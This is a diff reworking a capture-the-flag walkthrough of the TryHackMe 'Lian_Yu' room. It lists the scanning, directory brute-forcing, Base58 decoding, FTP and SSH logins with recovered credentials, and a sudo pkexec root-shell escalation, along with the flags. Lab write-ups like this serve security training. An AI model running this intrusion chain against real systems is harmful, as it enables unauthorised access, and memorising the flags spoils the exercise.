@@ -1,96 +1,74 @@
-
-Markdown
-# Lian_Yu CTF Walkthrough
-
-A comprehensive walkthrough of the **Lian_Yu** room on TryHackMe, focused on web enumeration, decryption, and privilege escalation via `pkexec`.
-
----
-
-## 1. Reconnaissance & Enumeration
+## 🔍 Phase 1: Enumeration
 
 ### Network Scanning
-I initiated the engagement by scanning the target IP `10.48.186.153` to identify open ports and services.
+I started with an **Nmap** scan to identify open services:
+--
+bash
+nmap -sV 10.48.186.153
+Port 21: FTP (vsFTPd 3.0.2)
 
-``bash
-nmap 10.48.186.153
-Open Ports Identified:
+Port 22: SSH
 
-21 (FTP): vsFTPd 3.0.2
-
-22 (SSH): OpenSSH
-
-80 (HTTP): Apache Web Server
-
-111 (rpcbind)
+Port 80: HTTP (Apache)
 
 Web Directory Discovery
-The web server hosted a page related to the "Arrowverse." I used gobuster to perform directory brute-forcing.
+Using Gobuster, I found a hidden directory path:
 
 Bash
 gobuster dir -u [http://10.48.186.153/island](http://10.48.186.153/island) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-Findings: * /island
+Path found: /island/2100
 
-/island/2100 (Found via recursive scanning)
+Information Gathering
+Code Word: Found vigilante in the HTML source of the main page.
 
-Hidden Information
-Inspecting the source code of the discovered pages revealed:
+Hidden Token: Found a file at /island/2100/green_arrow.ticket containing: RTy8yhBQdscX.
 
-The Code Word: A hidden string vigilante was found in the HTML.
+🔓 Phase 2: Gaining Access
+Decryption
+Using CyberChef, I decoded the token from Base58:
 
-The Ticket: A comment in the /2100 directory hinted at a .ticket file.
+Encoded: RTy8yhBQdscX
 
-Navigating to http://10.48.186.153/island/2100/green_arrow.ticket provided a Base58 encoded string: RTy8yhBQdscX.
+Decoded: !#th3h00d
 
-2. Initial Access & Data Extraction
-Decrypting the Token
-Using CyberChef, I decoded the Base58 string to reveal the password.
+FTP Data Extraction
+I logged into FTP using vigilante / !#th3h00d and downloaded ss.zip. After unzipping, I found the file shado.
 
-Input: RTy8yhBQdscX
+Credential Found: M3tahuman
 
-Output: !#th3h00d
-
-FTP Exploitation
-Using the username vigilante and the password !#th3h00d, I logged into the FTP server and retrieved a password-protected zip file named ss.zip.
-
-Bash
-ftp 10.48.186.153
-After extracting ss.zip using the identified passphrase, I obtained two sensitive files:
-
-passwd.txt
-
-shado (Content: M3tahuman)
-
-3. System Access & User Flag
+🚩 Phase 3: User Access
 SSH Login
-The file shado contained the password for the system user slade.
+I accessed the machine via SSH as the user slade:
 
 Bash
 ssh slade@10.48.186.153
 # Password: M3tahuman
-Capturing User Flag
-Once authenticated, I located the user flag in the home directory.
-
+User Flag
 Bash
-slade@LianYu:~$ cat user.txt
-THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
---Felicity Smoak
-4. Privilege Escalation to Root
-Sudo Rights Enumeration
-I checked the sudo permissions to identify misconfigurations.
+cat user.txt
+# THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
+⚡ Phase 4: Privilege Escalation (Root)
+Sudo Privileges
+Checking for sudo permissions:
 
 Bash
 slade@LianYu:~$ sudo -l
-Result: The user slade can run /usr/bin/pkexec as root with NOPASSWD.
+The user can run /usr/bin/pkexec as root without a password.
 
 Exploitation
-Using the GTFOBins method for pkexec, I successfully spawned a root shell:
+Using the GTFOBins technique to spawn a root shell:
 
 Bash
 sudo /usr/bin/pkexec /bin/sh
-Final Flag
-After gaining root access, I navigated to the root directory to finish the machine.
-
+Root Flag
 Bash
-# whoami
-root
-# cat /root/root.txt
+whoami # root
+cat /root/root.txt
+🛠️ Tools Used
+Nmap (Scanning)
+
+Gobuster (Directory Brute-forcing)
+
+CyberChef (Decoding)
+
+FTP/SSH (Access)
